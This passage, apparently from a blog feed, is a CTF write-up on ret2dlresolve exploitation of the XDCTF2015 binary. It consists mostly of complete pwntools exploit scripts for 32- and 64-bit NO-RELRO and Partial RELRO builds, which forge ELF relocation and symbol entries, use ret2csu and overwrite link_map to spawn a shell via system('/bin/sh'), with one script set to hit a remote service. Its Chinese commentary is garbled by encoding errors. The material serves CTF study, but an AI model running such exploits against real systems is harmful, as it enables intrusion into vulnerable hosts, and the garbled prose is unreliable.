class="comment"># get the data of .rel.plt</span></span><br><span class="line">rel_plt_ad=elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">p(<span class="string">&quot;rel_plt_ad&quot;</span>,rel_plt_ad)</span><br><span class="line">rel_plt_data=elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).data()</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="comment">#write_relplt_offset is the seonde parameter of _dl_runtime_resolve</span></span><br><span class="line">write_relplt_offset=rel_plt_data.find(p32(write_got))</span><br><span class="line">p(<span class="string">&#x27;write_relplt_offset&#x27;</span>,write_relplt_offset)</span><br><span class="line"><span class="comment">#åœ¨æ–°æ ˆçš„30å¤„ä¼ªé€ Elf32_Rel</span></span><br><span class="line">fake_write_relplt_offset=new_stack+<span class="number">30</span>-rel_plt_ad</span><br><span class="line"><span class="comment">#åœ¨æ–°æ ˆçš„40å¤„ä¼ªé€ Elf32_Symï¼Œä½†æ˜¯ç”±äºElf32_Syméœ€è¦16å­—èŠ‚æ‰€ä»¥è¦16å­—èŠ‚å¯¹é½ï¼Œåé¢éœ€è¦è¡¥ä¸ªåå·®å€¼align</span></span><br><span class="line">fake_sym_addr=new_stack+<span class="number">40</span></span><br><span class="line">align=<span class="number">0x10</span>-(fake_sym_addr-dynsym)&amp;<span class="number">0xf</span></span><br><span class="line"><span class="comment">#next rop the padding should be 40+align</span></span><br><span class="line">fake_sym_addr=fake_sym_addr+align</span><br><span class="line"><span class="comment">#ä¼ªé€ ç¬¦å·è¡¨Elf32_Symåœ¨dynsymçš„ä¸‹æ ‡</span></span><br><span class="line">index_dynsym=<span class="built_in">int</span>((fake_sym_addr-dynsym)/<span class="number">16</span>)</span><br><span class="line"><span class="comment">#é«˜24ä½æ˜¯ç¬¦å·åœ¨ç¬¦å·è¡¨é‡Œçš„ä¸‹æ ‡ï¼Œä½8ä½ä¸ºé‡å®šä½ç±»å‹</span></span><br><span class="line">r_info=(index_dynsym&lt;&lt;<span class="number">8</span>)|<span class="number">7</span></span><br><span class="line">fake_write_reloc=flat([write_got,r_info])</span><br><span class="line">gnu_version_addr = elf.get_section_by_name(<span class="string">&#x27;.gnu.version&#x27;</span>).header.sh_addr</span><br><span class="line"><span class="comment">#åœ¨æ–°æ ˆçš„70å¤„å†™å…¥å­—ç¬¦ä¸²systemä¼ªé€ å­—ç¬¦ä¸²è¡¨</span></span><br><span class="line">fake_write_str_ad=new_stack+<span class="number">70</span></span><br><span class="line"><span class="comment">#Elf32_Sym.st_nameçš„è·ç¦»dynstrçš„åç§»</span></span><br><span class="line">write_str_offset=fake_write_str_ad-dynstr</span><br><span class="line">fake_write_sym = flat([write_str_offset, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ndx_addr: %s&quot;</span> % <span class="built_in">hex</span>(gnu_version_addr+index_dynsym*<span class="number">2</span>))</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(fake_write_relplt_offset)</span><br><span class="line"><span class="comment"># fake ret of write</span></span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line"><span class="comment">#parameter of system</span></span><br><span class="line">rop.raw(new_stack + <span class="number">80</span>)</span><br><span class="line">sh = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">write_str=<span class="string">b&#x27;system\x00&#x27;</span></span><br><span class="line"><span class="comment"># print(len(rop.chain()))</span></span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">30</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line"><span class="comment">#fake_write_reloc</span></span><br><span class="line">rop.raw(fake_write_reloc)</span><br><span class="line"><span class="comment"># rop.raw(rel_plt_data[write_relplt_offset:write_relplt_offset+8])</span></span><br><span class="line"><span class="comment"># print(rel_plt_data[write_relplt_offset:write_relplt_offset+8])</span></span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">40</span>+align-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(fake_write_sym)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">70</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(write_str)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line"><span class="comment"># print(rop.dump())</span></span><br><span class="line"><span class="comment"># sleep(2)</span></span><br><span class="line">sl(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>rop.migrate(new_stack)çš„ç»“æœ</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">pop ebp; retçš„gadget</span><br><span class="line">new_stack-size_t</span><br><span class="line">leave; retçš„gadget</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆä¼šåœ¨rspä¸ºnew_stackæ—¶è¿›è¡Œretï¼Œæ‰€ä»¥éœ€è¦äº‹å…ˆåœ¨new_stackå¸ƒç½®å¥½è¦ropçš„å†…å®¹</p></blockquote><h3 id="pwntoolså·¥å…·"><a href="#pwntoolså·¥å…·" class="headerlink" title="pwntoolså·¥å…·"></a>pwntoolså·¥å…·</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./main_partial_relro_32&quot;</span>)</span><br><span class="line">rop = ROP(context.binary)</span><br><span class="line">db = lambda x : gdb.attach(io,x)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line">rop.read(<span class="number">0</span>,dlresolve.data_addr,<span class="number">0x100</span>)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line">print(rop.dump())</span><br><span class="line">io = process(<span class="string">&quot;./main_partial_relro_32&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *0x804853A&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>)</span><br><span class="line">padding=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload=padding+raw_rop</span><br><span class="line">io.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(dlresolve.payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>dlresolve.data_addrä¸€èˆ¬å°±æ˜¯æˆ‘ä»¬ä¼ªé€ ELFdyn sys strçš„bssåœ°å€ </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>],data_addr=æ¥æŒ‡å®šä¼ªé€ åœ°å€)</span><br></pre></td></tr></table></figure><p>print(rop.dump())</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[*] Loaded <span class="number">10</span> cached gadgets <span class="keyword">for</span> <span class="string">&#x27;./main_partial_relro_32&#x27;</span></span><br><span class="line"><span class="number">0x0000</span>:        <span class="number">0x8048390</span> read(<span class="number">0</span>, <span class="number">0x804ae00</span>, <span class="number">0x400</span>)</span><br><span class="line"><span class="number">0x0004</span>:        <span class="number">0x804836a</span> &lt;adjust @<span class="number">0x14</span>&gt; add esp, <span class="number">8</span>; pop ebx; ret</span><br><span class="line"><span class="number">0x0008</span>:              <span class="number">0x0</span> arg0</span><br><span class="line"><span class="number">0x000c</span>:        <span class="number">0x804ae00</span> arg1</span><br><span class="line"><span class="number">0x0010</span>:            <span class="number">0x400</span> arg2</span><br><span class="line"><span class="number">0x0014</span>:        <span class="number">0x8048370</span> [plt_init] system(<span class="number">0x804ae24</span>)</span><br><span class="line"><span class="number">0x0018</span>:           <span class="number">0x2af8</span> [dlresolve index]</span><br><span class="line"><span class="number">0x001c</span>:          b<span class="number">&#x27;</span>haaa<span class="number">&#x27;</span> &lt;system <span class="keyword">return</span> address&gt;</span><br><span class="line"><span class="number">0x0020</span>:        <span class="number">0x804ae24</span> system arg0</span><br></pre></td></tr></table></figure><h2 id="64ä½"><a href="#64ä½" class="headerlink" title="64ä½"></a>64ä½</h2><h3 id="NO-RELRO-1"><a href="#NO-RELRO-1" class="headerlink" title="NO-RELRO"></a>NO-RELRO</h3><p>åªèƒ½ç”¨ret2csuæ¥æ§åˆ¶rdx</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000400750</span> <span class="number">4</span>C <span class="number">89</span> FA                      mov     rdx, r15</span><br><span class="line">.text:<span class="number">0000000000400753</span> <span class="number">4</span>C <span class="number">89</span> F6                      mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400756</span> <span class="number">44</span> <span class="number">89</span> EF                      mov     edi, r13d</span><br><span class="line">.text:<span class="number">0000000000400759</span> <span class="number">41</span> FF <span class="number">14</span> DC                   call    ds:(__frame_dummy_init_array_entry - <span class="number">6008F</span>8h)[r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">0000000000400759</span></span><br><span class="line">.text:<span class="number">000000000040075</span>D <span class="number">48</span> <span class="number">83</span> C3 <span class="number">01</span>                   add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400761</span> <span class="number">48</span> <span class="number">39</span> DD                      cmp     rbp, rbx</span><br><span class="line">.text:<span class="number">0000000000400764</span> <span class="number">75</span> EA                         jnz     <span class="type">short</span> loc_400750</span><br><span class="line">.text:<span class="number">0000000000400764</span></span><br><span class="line">.text:<span class="number">0000000000400766</span></span><br><span class="line">.text:<span class="number">0000000000400766</span>                               loc_400766:                             ; CODE XREF: __libc_csu_init+<span class="number">34</span>â†‘j</span><br><span class="line">.text:<span class="number">0000000000400766</span> <span class="number">48</span> <span class="number">83</span> C4 <span class="number">08</span>                   add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040076</span>A <span class="number">5B</span>                            pop     rbx</span><br><span class="line">.text:<span class="number">000000000040076B</span> <span class="number">5</span>D                            pop     rbp</span><br><span class="line">.text:<span class="number">000000000040076</span>C <span class="number">41</span> <span class="number">5</span>C                         pop     r12</span><br><span class="line">.text:<span class="number">000000000040076</span>E <span class="number">41</span> <span class="number">5</span>D                         pop     r13</span><br><span class="line">.text:<span class="number">0000000000400770</span> <span class="number">41</span> <span class="number">5</span>E                         pop     r14</span><br><span class="line">.text:<span class="number">0000000000400772</span> <span class="number">41</span> <span class="number">5F</span>                         pop     r15</span><br><span class="line">.text:<span class="number">0000000000400774</span> C3                            retn</span><br></pre></td></tr></table></figure><p>å’Œ32ä½ä¸€æ ·ï¼Œä¼ªé€ ä¸€ä¸ªå°†readæ”¹ä¸ºsystemçš„dynstråˆ°bssï¼Œå°†dynmicçš„dynstråœ°å€æ”¹ä¸ºä¼ªé€ åˆ°bssçš„dynstrï¼Œå°†å‚æ•°rdiè¦†ç›–ä¸ºbinshï¼Œropåˆ°readçš„pltç¬¬äºŒæ¡æŒ‡ä»¤è§¦å‘_dl_runtime_resolveï¼Œæ‰§è¡Œsystem</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main_no_relro_64&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;28808&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)  </span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">csu_front_addr = <span class="number">0x400750</span></span><br><span class="line">csu_end_addr = <span class="number">0x40076A</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2csu</span>(<span class="params">func,a1,a2,a3,return_ad</span>):</span><br><span class="line">    rbx=<span class="number">0</span></span><br><span class="line">    rbp=<span class="number">1</span></span><br><span class="line">    r12=func</span><br><span class="line">    r13=a1</span><br><span class="line">    r14=a2</span><br><span class="line">    r15=a3</span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload+=<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>+p64(return_ad)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">    </span><br><span class="line">db(<span class="string">&#x27;b *0x040063C&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;read&quot;</span>,<span class="string">b&quot;system&quot;</span>)</span><br><span class="line"><span class="comment">#stack mrigrate to new_stackæ ˆè¿ç§»</span></span><br><span class="line">bss_ad=elf.bss()+<span class="number">0x200</span></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">start=elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">120</span></span><br><span class="line">rop.raw(padding)</span><br><span class="line">rop.raw(ret2csu(read_got,<span class="number">0</span>,bss_ad,<span class="built_in">len</span>(dynstr+<span class="string">b&#x27;\x00/bin/sh\x00&#x27;</span>),start))</span><br><span class="line">s(rop.chain().ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">s(dynstr+<span class="string">b&#x27;\x00/bin/sh\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">dynmic_dynstr=<span class="number">0x600988</span>+<span class="number">8</span></span><br><span class="line">poprdi=<span class="number">0x0400773</span></span><br><span class="line">payload=padding+ret2csu(read_got,<span class="number">0</span>,dynmic_dynstr,<span class="number">8</span>,start)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">s(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">s(p64(bss_ad))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">read_plt=<span class="number">0x400516</span></span><br><span class="line">padding=<span class="string">b&#x27;d&#x27;</span>*<span class="number">120</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">ret=<span class="number">0x00000000004004c6</span></span><br><span class="line">payload=padding+p64(poprdi)+p64(bss_ad+<span class="built_in">len</span>(dynstr)+<span class="number">1</span>)+p64(ret)+p64(read_plt)</span><br><span class="line">s(payload)</span><br><span class="line"><span class="comment"># # b()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="Partial-RELRO-1"><a href="#Partial-RELRO-1" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><p>å’Œ32ä¸ºåŸºæœ¬ä¸Šå·®ä¸å¤šï¼Œåœ¨ 64 ä½ä¸‹ï¼Œplt ä¸­çš„ä»£ç  push çš„æ˜¯å¾…è§£æç¬¦å·åœ¨é‡å®šä½è¡¨ä¸­çš„ç´¢å¼•ï¼Œè€Œä¸æ˜¯åç§»ã€‚</p><p><img src="/2023/07/09/ret2dlresolve/image-20230724174219575.png" alt="image-20230724174219575"></p><p>Versym: 0x4003f6æŒ‡å‘ç‰ˆæœ¬å·æ•°ç»„ï¼Œç¬¦å·è¡¨ç´¢å¼•ï¼ŒåŒæ—¶ä¸ºç‰ˆæœ¬å·ç´¢å¼• å¯¼è‡´ï¼Œversion index addræŒ‡å‘ä¸å­˜åœ¨å†…å­˜ï¼Œå¯¼è‡´è§£ææ—¶é”™è¯¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è·å–ç¬¦å·çš„ç‰ˆæœ¬ä¿¡æ¯, dl_fixup çš„ä»£ç </span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX(DT_VERSYM)] != <span class="literal">NULL</span>)<span class="comment">//lä¸ºlink_mapç»“æ„ä½“</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum = (<span class="type">const</span> <span class="type">void</span> *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line"><span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> &#123;</span></span><br><span class="line">    Elf64_Addr l_addr;</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *l_name;</span><br><span class="line"> </span><br><span class="line">    Elf64_Dyn *l_ld;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_prev</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"> </span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line"> </span><br><span class="line">    Elf64_Dyn *l_info[<span class="number">76</span>];  <span class="comment">//l_info é‡Œé¢åŒ…å«çš„å°±æ˜¯åŠ¨æ€é“¾æ¥çš„å„ä¸ªè¡¨çš„ä¿¡æ¯</span></span><br><span class="line">    ...</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> l_tls_firstbyte_offset;</span><br><span class="line"> </span><br><span class="line">    <span class="type">ptrdiff_t</span> l_tls_offset;</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> l_tls_modid;</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> l_tls_dtor_count;</span><br><span class="line"> </span><br><span class="line">    Elf64_Addr l_relro_addr;</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> l_relro_size;</span><br><span class="line"> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> l_serial;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">auditstate</span> <span class="title">l_audit</span>[];</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æŠŠlinkmapçš„l_info[VERSYMIDX(DT_VERSYM)]å†™ä¸º0æ¥ç»•è¿‡æ‰§è¡Œ</p><p>linkmapä¸ºgotè¡¨çš„ç¬¬äºŒé¡¹ï¼Œl_info[VERSYMIDX(DT_VERSYM)]ä¸ºlinkmapåç§»0x1c8å¤„</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main_partial_relro_64&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;28808&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)  </span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *0x40066C&#x27;</span>)</span><br><span class="line">csu_front_addr = <span class="number">0x00400780</span></span><br><span class="line">csu_end_addr = <span class="number">0x0040079A</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2csu</span>(<span class="params">func,a1,a2,a3,return_ad</span>):</span><br><span class="line">    rbx=<span class="number">0</span></span><br><span class="line">    rbp=<span class="number">1</span></span><br><span class="line">    r12=func</span><br><span class="line">    r13=a1</span><br><span class="line">    r14=a2</span><br><span class="line">    r15=a3</span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload+=<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>+p64(return_ad)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rela.plt&#x27;</span>).header.sh_addr</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rel_plt))</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">padding=<span class="string">b&#x27;d&#x27;</span>*<span class="number">120</span></span><br><span class="line"><span class="built_in">print</span>(rop.dump())</span><br><span class="line">p(<span class="string">&#x27;dlresolve.data_addr&#x27;</span>,dlresolve.data_addr)</span><br><span class="line">start=elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">got_0=<span class="number">0x0601008</span></span><br><span class="line"><span class="comment">#æ³„éœ²linkmapå¯¼è‡´</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">payload=padding+ret2csu(write_got,<span class="number">1</span>,got_0,<span class="number">8</span>,start)</span><br><span class="line">s(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">link_map_addr =uu64(r(<span class="number">6</span>))</span><br><span class="line">p(<span class="string">&#x27;link_map_addr&#x27;</span>,link_map_addr)</span><br><span class="line"><span class="comment">#linkmap-&gt;l_info[VERSYMIDX(DT_VERSYM)]å³linkmapåç§»0x1c8å¤„å†™å…¥0</span></span><br><span class="line">payload=padding+ret2csu(read_got,<span class="number">0</span>,link_map_addr+<span class="number">0x1c8</span>,<span class="number">8</span>,start)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">s(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">payload=padding+ret2csu(read_got,<span class="number">0</span>,dlresolve.data_addr,<span class="number">0x100</span>,start)</span><br><span class="line">s(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(dlresolve.payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">payload=padding+rop.chain()</span><br><span class="line">s(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>RISC-V ASM</title>
      <link href="/2023/07/09/risc-v-asm/"/>
      <url>/2023/07/09/risc-v-asm/</url>
      
